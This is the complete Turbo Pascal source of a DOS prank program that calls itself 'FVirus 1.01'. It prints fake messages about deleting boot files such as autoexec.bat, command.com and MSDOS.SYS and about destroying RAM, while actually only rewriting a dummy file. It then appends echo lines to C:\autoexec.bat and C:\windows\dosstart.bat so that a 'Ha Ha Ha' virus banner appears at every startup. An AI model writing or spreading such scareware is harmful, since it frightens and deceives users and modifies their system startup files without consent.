program diie;
uses crt,dos;
var f:text;
    x,y:integer;

{Don't Run this, It's bad for your pc's hard drive plus it adds crap to your
autoexec.bat}

procedure die;
begin;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
gotoxy(1,1);
writeln('now deleting autoexec.bat');
repeat
x:=x+1;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
until x=10;
writeln('now deleting config.sys');
x:=0;
repeat
x:=x+1;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
delay(1000);
until x=10;
writeln('Now killing command.com');
x:=0;
repeat
x:=x+1;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
delay(100);
until x=10;
writeln('Now eating IO.SYS ');
x:=0;
repeat
x:=x+1;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
delay(100);
until x=10;
writeln('Now deleting MSDOS.SYS');
x:=0;
repeat
x:=x+1;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
delay(100);
until x=10;


writeln('Now destroying RAM chips');
x:=0;
repeat
x:=x+1;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
delay(100);
until x=10;



end;

begin;
clrscr;
Assign(F, 'tempo.exp');  { Standard output }
Rewrite(F);
Writeln(F, 'standard output...');
Close(F);
die;
{close(F);}

Assign(F, 'C:\windows\dosstart.bat');  { Standard output }
Append(F);
writeln(F,'@cls');
Writeln(F, '@echo Ha Ha Ha');
Writeln(F, '@echo FVirus 1.01 has been run on this computer');
Close(F);
Assign(F, 'C:\autoexec.bat');  { Standard output }
Append(F);
writeln(F,'@cls');
Writeln(F, '@echo Ha Ha Ha');
Writeln(F, '@echo FVirus 1.01 has been run on this computer');
Close(F);

end.
